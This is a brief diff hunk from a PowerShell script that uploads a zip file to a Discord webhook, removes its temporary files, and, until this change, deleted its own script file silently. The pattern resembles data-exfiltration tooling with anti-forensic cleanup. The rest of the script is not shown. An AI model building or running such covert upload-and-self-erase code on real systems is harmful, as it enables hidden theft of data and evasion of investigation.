@@ -345,8 +345,3 @@ Upload-DiscordWebhook -WebhookUrl $WebhookUrl -ZipFilePath $zipPath
 # Clean up
 if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
 if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
-
-# Delete this script file after execution
-try {
-    Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
-} catch {}
